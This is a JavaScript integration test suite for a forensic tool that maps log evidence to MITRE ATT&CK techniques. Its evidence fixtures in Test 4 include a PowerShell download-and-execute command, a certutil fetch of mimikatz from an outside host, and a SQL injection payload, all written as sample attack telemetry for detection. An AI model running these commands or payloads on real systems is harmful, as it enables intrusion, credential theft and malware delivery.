/**
 * TRACE AI - Phase 5: MITRE ATT&CK Mapping Engine Integration Test Suite
 *
 * Verifies:
 * 1. Authentication and authorization enforcement for MITRE APIs
 * 2. Case creation and multi-format evidence ingestion
 * 3. IOC and timeline pre-seeding
 * 4. Deterministic MITRE mapping generation (POST /api/mitre/generate)
 * 5. Verified ATT&CK metadata retrieval & documented catalog limitation interface
 * 6. Deterministic rule matching, explainable rationale, and matched telemetry
 * 7. Distinction between observed facts vs inferred techniques
 * 8. Complete evidence and timeline provenance retention
 * 9. Idempotency and duplicate prevention on repeated generation
 * 10. Analyst review status transitions (PATCH /api/mitre/:id/status)
 * 11. Strict preservation of analyst decisions across re-generation
 * 12. Case isolation and access boundaries
 * 13. Multi-dimensional filtering, pagination, and case stats API
 * 14. Direct local MongoDB persistence (arclight_dfir) and audit logging
 */

const mongoose = require('mongoose');

const BASE_URL = 'http://localhost:5000/api';
const MONGO_URI = 'mongodb://127.0.0.1:27017/arclight_dfir';

// Mongoose Models
const MitreMapping = require('../models/MitreMapping');
const TimelineEvent = require('../models/TimelineEvent');
const AuditLog = require('../models/AuditLog');
const { getTechniqueMetadata } = require('../services/mitreCatalog.service');

let passedTests = 0;
let failedTests = 0;

function recordTest(testNum, name, passed, detail = '') {
  if (passed) {
    console.log(`[PASS] Test ${testNum}: ${name}${detail ? ` - ${detail}` : ''}`);
    passedTests++;
  } else {
    console.error(`[FAIL] Test ${testNum}: ${name}${detail ? ` - ${detail}` : ''}`);
    failedTests++;
  }
}

async function runTests() {
  console.log('======================================================================');
  console.log('TRACE AI - PHASE 5: MITRE ATT&CK MAPPING ENGINE INTEGRATION TEST SUITE');
  console.log(`Backend API: ${BASE_URL}`);
  console.log(`MongoDB URI: ${MONGO_URI}`);
  console.log('======================================================================\n');

  let token = null;
  let authHeaders = {};
  let caseIdA = null;
  let caseIdB = null;

  // -------------------------------------------------------------------------
  // Test 1: Authentication as Operator
  // -------------------------------------------------------------------------
  try {
    const res = await fetch(`${BASE_URL}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'cso@trace.ai',
        password: 'clearancepassword123'
      })
    });
    const body = await res.json();
    token = body.token || body.data?.token;
    if (res.ok && token) {
      authHeaders = {
        Authorization: `Bearer ${token}`
      };
      recordTest(1, 'Authentication as Operator', true, 'Clearance token obtained');
    } else {
      recordTest(1, 'Authentication as Operator', false, body.error?.message || 'Login failed');
      process.exit(1);
    }
  } catch (err) {
    recordTest(1, 'Authentication as Operator', false, err.message);
    process.exit(1);
  }

  // -------------------------------------------------------------------------
  // Test 2: Authorization Enforcement for MITRE APIs
  // -------------------------------------------------------------------------
  try {
    const resGen = await fetch(`${BASE_URL}/mitre/generate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ caseId: 'CASE-TEST-UNAUTH' })
    });
    const resList = await fetch(`${BASE_URL}/mitre?caseId=CASE-TEST-UNAUTH`);

    const passed = resGen.status === 401 && resList.status === 401;
    recordTest(2, 'Authorization Enforcement for MITRE APIs', passed, `Generate: ${resGen.status}, List: ${resList.status}`);
  } catch (err) {
    recordTest(2, 'Authorization Enforcement for MITRE APIs', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 3: Create Isolated Test Cases (Case A and Case B)
  // -------------------------------------------------------------------------
  try {
    const caseARes = await fetch(`${BASE_URL}/cases`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        title: 'Phase 5 MITRE ATT&CK Investigation Test Case A',
        description: 'Case A evaluating deterministic attack mapping from multi-format forensic evidence.',
        severity: 'Critical'
      })
    });
    const caseABody = await caseARes.json();
    caseIdA = caseABody.data?.caseId;

    const caseBRes = await fetch(`${BASE_URL}/cases`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        title: 'Phase 5 MITRE ATT&CK Isolation Test Case B',
        description: 'Case B verifying strict tenant isolation and boundary controls.',
        severity: 'Medium'
      })
    });
    const caseBBody = await caseBRes.json();
    caseIdB = caseBBody.data?.caseId;

    const passed = caseARes.status === 201 && caseBRes.status === 201 && !!caseIdA && !!caseIdB;
    recordTest(3, 'Create Isolated Test Cases', passed, `Case A: ${caseIdA}, Case B: ${caseIdB}`);
  } catch (err) {
    recordTest(3, 'Create Isolated Test Cases', false, err.message);
    process.exit(1);
  }

  // -------------------------------------------------------------------------
  // Test 4: Ingest Multi-Format Evidence with Diverse Attack Patterns into Case A
  // -------------------------------------------------------------------------
  try {
    const formDataA = new FormData();
    formDataA.append('caseId', caseIdA);
    formDataA.append('batchId', `BATCH-MITRE-${Date.now()}`);

    // Evidence 1: Syslog / Auth Log with Brute Force attempts
    const authLogContent = [
      'Sep 29 14:00:01 srv-prod sshd[1020]: Failed password for invalid user root from 198.51.100.25 port 45212 ssh2',
      'Sep 29 14:00:03 srv-prod sshd[1022]: Failed password for invalid user admin from 198.51.100.25 port 45214 ssh2',
      'Sep 29 14:00:10 srv-prod sshd[1025]: Accepted password for admin_local_svc from 10.0.0.14 port 45220 ssh2'
    ].join('\n');

    // Evidence 2: Web Server Access Log with SQL Injection exploit pattern
    const webLogContent = [
      '198.51.100.25 - - [29/Sep/2026:14:05:00 +0000] "GET /api/v1/search?q=\' UNION SELECT null,password,email FROM users-- HTTP/1.1" 200 4520',
      '10.0.0.5 - - [29/Sep/2026:14:06:00 +0000] "GET /dashboard HTTP/1.1" 200 1250'
    ].join('\n');

    // Evidence 3: Host EDR Telemetry (JSONL) with PowerShell and User Discovery execution
    const hostEdrContent = [
      '{"timestamp":"2026-09-29T14:15:00Z","process":"powershell.exe","cmdline":"powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.25/payload.ps1\')"}',
      '{"timestamp":"2026-09-29T14:16:00Z","process":"cmd.exe","cmdline":"cmd.exe /c whoami.exe /all"}',
      '{"timestamp":"2026-09-29T14:18:00Z","process":"certutil.exe","cmdline":"certutil.exe -urlcache -f http://198.51.100.25/mimikatz.exe mimikatz.exe"}'
    ].join('\n');

    // Evidence 4: Network Firewall Log with C2 egress and Defense Tampering
    const firewallLogContent = [
      'Sep 29 14:20:00 gateway kernel: [FIREWALL] BLOCKED outbound connect to 198.51.100.25:443 proto TCP',
      'Sep 29 14:22:00 host-srv auditd[552]: Netfilter firewall set opmode disable requested by unauthorized session'
    ].join('\n');

    formDataA.append('relativePaths', JSON.stringify([
      'logs/auth.log',
      'web/access.log',
      'edr/processes.jsonl',
      'network/firewall.log'
    ]));

    formDataA.append('files', new Blob([authLogContent], { type: 'text/plain' }), 'auth.log');
    formDataA.append('files', new Blob([webLogContent], { type: 'text/plain' }), 'access.log');
    formDataA.append('files', new Blob([hostEdrContent], { type: 'text/plain' }), 'processes.jsonl');
    formDataA.append('files', new Blob([firewallLogContent], { type: 'text/plain' }), 'firewall.log');

    const res = await fetch(`${BASE_URL}/evidence/upload`, {
      method: 'POST',
      headers: authHeaders,
      body: formDataA
    });
    const body = await res.json();

    recordTest(4, 'Ingest Multi-Format Evidence with Diverse Attack Patterns',
      res.status === 201 && body.data.length === 4,
      `Uploaded 4 evidence files across Auth, Web, EDR, and Firewall logs`
    );
  } catch (err) {
    recordTest(4, 'Ingest Multi-Format Evidence with Diverse Attack Patterns', false, err.message);
    process.exit(1);
  }

  // -------------------------------------------------------------------------
  // Test 5: Pre-seed IOCs and Forensic Timeline for Case A
  // -------------------------------------------------------------------------
  try {
    // Detect IOCs
    const iocRes = await fetch(`${BASE_URL}/ioc/detect`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({ caseId: caseIdA })
    });
    const iocBody = await iocRes.json();

    // Generate Timeline
    const tlRes = await fetch(`${BASE_URL}/timeline/generate`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({ caseId: caseIdA })
    });
    const tlBody = await tlRes.json();

    const passed = iocRes.status === 200 && tlRes.status === 200 && tlBody.data?.totalEvents > 0;
    recordTest(5, 'Pre-seed IOCs and Forensic Timeline for Case Correlation',
      passed,
      `IOCs: ${iocBody.data?.totalDetected || 0}, Timeline Events: ${tlBody.data?.totalEvents || 0}`
    );
  } catch (err) {
    recordTest(5, 'Pre-seed IOCs and Forensic Timeline for Case Correlation', false, err.message);
    process.exit(1);
  }

  // -------------------------------------------------------------------------
  // Test 6: Generate MITRE ATT&CK Candidate Mappings (POST /api/mitre/generate)
  // -------------------------------------------------------------------------
  let genMetrics = null;
  try {
    const res = await fetch(`${BASE_URL}/mitre/generate`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({ caseId: caseIdA })
    });
    const body = await res.json();
    genMetrics = body.data;

    // All initial mappings must strictly be candidates
    const passed = res.status === 200 &&
      body.success &&
      genMetrics.totalMapped >= 4 &&
      genMetrics.candidates === genMetrics.totalMapped &&
      genMetrics.confirmed === 0;

    recordTest(6, 'Generate MITRE ATT&CK Candidate Mappings (POST /api/mitre/generate)',
      passed,
      `Mapped: ${genMetrics?.totalMapped} techniques, Candidates: ${genMetrics?.candidates}, Confirmed: ${genMetrics?.confirmed}`
    );
  } catch (err) {
    recordTest(6, 'Generate MITRE ATT&CK Candidate Mappings', false, err.message);
    process.exit(1);
  }

  // -------------------------------------------------------------------------
  // Test 7: Verified ATT&CK Metadata Retrieval & Documented Catalog Interface
  // -------------------------------------------------------------------------
  try {
    // 1. Known verified technique (T1110.001)
    const verifiedMeta = getTechniqueMetadata('T1110.001');
    const hasValidDetails = verifiedMeta.verified === true &&
      verifiedMeta.techniqueName === 'Brute Force: Password Guessing' &&
      verifiedMeta.tactics.some(t => t.tacticId === 'TA0006');

    // 2. Unverified technique ID must report documented limitation without inventing metadata
    const unknownMeta = getTechniqueMetadata('T9999.999');
    const handlesLimitation = unknownMeta.verified === false &&
      !!unknownMeta.limitationNotice &&
      unknownMeta.limitationNotice.includes('not present in local verified MITRE ATT&CK');

    const passed = hasValidDetails && handlesLimitation;
    recordTest(7, 'Verified ATT&CK Metadata Retrieval & Documented Catalog Interface',
      passed,
      `Verified: ${verifiedMeta.techniqueId}, Limitation Handled: ${handlesLimitation}`
    );
  } catch (err) {
    recordTest(7, 'Verified ATT&CK Metadata Retrieval & Documented Catalog Interface', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 8: Deterministic Rule Matching & Explainable Rationale Verification
  // -------------------------------------------------------------------------
  let caseAMappings = [];
  try {
    const res = await fetch(`${BASE_URL}/mitre?caseId=${caseIdA}&limit=100`, { headers: authHeaders });
    const body = await res.json();
    caseAMappings = body.data.items || [];

    // Verify mappings have matchedRules with ruleId, ruleName, rationale, matchedTelemetry
    const allHaveExplainableRules = caseAMappings.length > 0 && caseAMappings.every(m =>
      Array.isArray(m.matchedRules) &&
      m.matchedRules.length > 0 &&
      !!m.matchedRules[0].ruleId &&
      !!m.matchedRules[0].ruleName &&
      !!m.matchedRules[0].rationale
    );

    recordTest(8, 'Deterministic Rule Matching & Explainable Rationale',
      allHaveExplainableRules,
      `Verified ${caseAMappings.length} mappings possess explicit rule IDs and transparent rationales`
    );
  } catch (err) {
    recordTest(8, 'Deterministic Rule Matching & Explainable Rationale', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 9: Distinction Between Observed Facts vs. Inferred Techniques
  // -------------------------------------------------------------------------
  try {
    // PowerShell execution (T1059.001) should be an observed fact
    const psMapping = caseAMappings.find(m => m.techniqueId === 'T1059.001');
    const psIsObserved = psMapping?.detectionType === 'observed';

    // Password guessing (T1110.001) should be an inferred technique
    const bruteMapping = caseAMappings.find(m => m.techniqueId === 'T1110.001');
    const bruteIsInferred = bruteMapping?.detectionType === 'inferred';

    const passed = psIsObserved && bruteIsInferred;
    recordTest(9, 'Distinction Between Observed Facts vs Inferred Techniques',
      passed,
      `PowerShell (T1059.001): ${psMapping?.detectionType}, Password Guessing (T1110.001): ${bruteMapping?.detectionType}`
    );
  } catch (err) {
    recordTest(9, 'Distinction Between Observed Facts vs Inferred Techniques', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 10: Complete Evidence and Timeline Provenance Retention
  // -------------------------------------------------------------------------
  try {
    // Check Brute Force mapping provenance
    const bruteMapping = caseAMappings.find(m => m.techniqueId === 'T1110.001');
    const hasEvidenceRefs = Array.isArray(bruteMapping?.evidenceReferences) && bruteMapping.evidenceReferences.length > 0;
    const firstRef = bruteMapping?.evidenceReferences[0];
    const hasRefDetails = !!firstRef?.evidenceId && !!firstRef?.fileName && !!firstRef?.excerpt;

    // Check timeline event references
    const hasTimelineRefs = Array.isArray(bruteMapping?.timelineEventIds) && bruteMapping.timelineEventIds.length > 0;

    const passed = hasEvidenceRefs && hasRefDetails && hasTimelineRefs;
    recordTest(10, 'Complete Evidence and Timeline Provenance Retention',
      passed,
      `Evidence File: ${firstRef?.fileName}, Line: ${firstRef?.lineNumber}, Timeline Events: ${bruteMapping?.timelineEventIds?.length}`
    );
  } catch (err) {
    recordTest(10, 'Complete Evidence and Timeline Provenance Retention', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 11: Idempotency & Duplicate Prevention on Repeated Generation
  // -------------------------------------------------------------------------
  try {
    const countBefore = caseAMappings.length;

    // Run generate again for Case A
    const res2 = await fetch(`${BASE_URL}/mitre/generate`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({ caseId: caseIdA })
    });
    const body2 = await res2.json();
    const countAfter = body2.data.totalMapped;
    const newInSecondRun = body2.data.newMappings;

    // Query DB directly to verify document count
    await mongoose.connect(MONGO_URI);
    const dbCount = await MitreMapping.countDocuments({ caseId: caseIdA });
    await mongoose.disconnect();

    const passed = countBefore === countAfter && newInSecondRun === 0 && dbCount === countBefore;
    recordTest(11, 'Idempotency & Duplicate Prevention on Repeated Generation',
      passed,
      `Run 1: ${countBefore}, Run 2: ${countAfter} (New: ${newInSecondRun}), DB Total: ${dbCount}`
    );
  } catch (err) {
    recordTest(11, 'Idempotency & Duplicate Prevention on Repeated Generation', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 12: Analyst Status Transition (PATCH /api/mitre/:id/status -> confirmed)
  // -------------------------------------------------------------------------
  let confirmedMappingId = null;
  try {
    const target = caseAMappings.find(m => m.techniqueId === 'T1110.001');
    confirmedMappingId = target?.mappingId;

    const res = await fetch(`${BASE_URL}/mitre/${confirmedMappingId}/status`, {
      method: 'PATCH',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        status: 'confirmed',
        notes: 'Analyst reviewed SSH brute force telemetry and verified repeated invalid password attempts.'
      })
    });
    const body = await res.json();
    const updated = body.data;

    const passed = res.status === 200 &&
      updated?.mappingStatus === 'confirmed' &&
      !!updated?.reviewedBy &&
      !!updated?.reviewedAt &&
      updated?.analystNotes.includes('Analyst reviewed SSH brute force');

    recordTest(12, 'Analyst Status Transition (PATCH /api/mitre/:id/status -> confirmed)',
      passed,
      `Status: ${updated?.mappingStatus}, Reviewer: ${updated?.reviewedBy}, Timestamp: ${updated?.reviewedAt}`
    );
  } catch (err) {
    recordTest(12, 'Analyst Status Transition', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 13: Strict Preservation of Analyst Decisions on Re-generation
  // -------------------------------------------------------------------------
  try {
    // Run generation again for Case A
    await fetch(`${BASE_URL}/mitre/generate`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({ caseId: caseIdA })
    });

    // Fetch the updated mapping
    const res = await fetch(`${BASE_URL}/mitre/${confirmedMappingId}`, { headers: authHeaders });
    const body = await res.json();
    const mappingAfterRegen = body.data;

    // Verify it is STILL confirmed and was NOT reset to candidate!
    const passed = mappingAfterRegen?.mappingStatus === 'confirmed' &&
      mappingAfterRegen?.analystNotes?.includes('Analyst reviewed SSH brute force');

    recordTest(13, 'Strict Preservation of Analyst Decisions on Re-generation',
      passed,
      `Status Retained: ${mappingAfterRegen?.mappingStatus}, Notes Preserved: ${!!mappingAfterRegen?.analystNotes}`
    );
  } catch (err) {
    recordTest(13, 'Strict Preservation of Analyst Decisions on Re-generation', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 14: Case-Scoped Isolation & Authorization Boundary
  // -------------------------------------------------------------------------
  try {
    // Ingest clean evidence file into Case B
    const formDataB = new FormData();
    formDataB.append('caseId', caseIdB);
    formDataB.append('batchId', `BATCH-MITRE-B-${Date.now()}`);
    formDataB.append('relativePaths', JSON.stringify(['clean_system.log']));
    formDataB.append('files', new Blob(['2026-09-29T18:00:00Z hostB daemon: Routine system maintenance completed'], { type: 'text/plain' }), 'clean_system.log');

    await fetch(`${BASE_URL}/evidence/upload`, {
      method: 'POST',
      headers: authHeaders,
      body: formDataB
    });

    // Generate mappings for Case B
    await fetch(`${BASE_URL}/mitre/generate`, {
      method: 'POST',
      headers: { ...authHeaders, 'Content-Type': 'application/json' },
      body: JSON.stringify({ caseId: caseIdB })
    });

    // Query Case B mappings
    const resB = await fetch(`${BASE_URL}/mitre?caseId=${caseIdB}`, { headers: authHeaders });
    const bodyB = await resB.json();
    const mappingsB = bodyB.data.items || [];

    // Case B should have 0 mappings (routine log contains no attack patterns)
    // and MUST NOT contain any of Case A's techniques!
    const caseBHasNoLeak = !mappingsB.some(m => m.techniqueId === 'T1110.001');

    recordTest(14, 'Case-Scoped Isolation & Authorization Boundary',
      caseBHasNoLeak,
      `Case B Total: ${mappingsB.length}, Excludes Case A T1110.001: ${caseBHasNoLeak}`
    );
  } catch (err) {
    recordTest(14, 'Case-Scoped Isolation & Authorization Boundary', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Test 15: Direct Local MongoDB Persistence & Audit Trail Verification
  // -------------------------------------------------------------------------
  try {
    await mongoose.connect(MONGO_URI);

    const dbMappingsCount = await MitreMapping.countDocuments({ caseId: caseIdA });
    const dbConfirmed = await MitreMapping.findOne({ caseId: caseIdA, mappingStatus: 'confirmed' });

    // Verify AuditLog entries
    const dbGenAudit = await AuditLog.findOne({
      action: 'GENERATE_MITRE_MAPPINGS',
      $or: [
        { description: { $regex: caseIdA } },
        { details: { $regex: caseIdA } }
      ]
    });

    const dbReviewAudit = await AuditLog.findOne({
      action: 'REVIEW_MITRE_MAPPING',
      $or: [
        { description: { $regex: 'confirmed' } },
        { details: { $regex: 'confirmed' } }
      ]
    });

    await mongoose.disconnect();

    const passed = dbMappingsCount > 0 && !!dbConfirmed && !!dbGenAudit && !!dbReviewAudit;

    recordTest(15, 'Direct Local MongoDB Persistence & Audit Trail',
      passed,
      `Persisted: ${dbMappingsCount}, Confirmed in DB: ${!!dbConfirmed}, Gen Audit: ${!!dbGenAudit}, Review Audit: ${!!dbReviewAudit}`
    );
  } catch (err) {
    recordTest(15, 'Direct Local MongoDB Persistence & Audit Trail', false, err.message);
  }

  // -------------------------------------------------------------------------
  // Summary
  // -------------------------------------------------------------------------
  console.log('\n======================================================================');
  console.log('TEST SUMMARY RESULTS');
  console.log('======================================================================');
  console.log(`Total Tests Executed: ${passedTests + failedTests}`);
  console.log(`Passed: ${passedTests}`);
  console.log(`Failed: ${failedTests}`);
  console.log('======================================================================\n');

  if (failedTests > 0) {
    console.error('>>> SOME MITRE ATT&CK INTEGRATION TESTS FAILED <<<\n');
    process.exit(1);
  } else {
    console.log('>>> ALL MITRE ATT&CK ENGINE INTEGRATION TESTS PASSED <<<\n');
    process.exit(0);
  }
}

runTests();
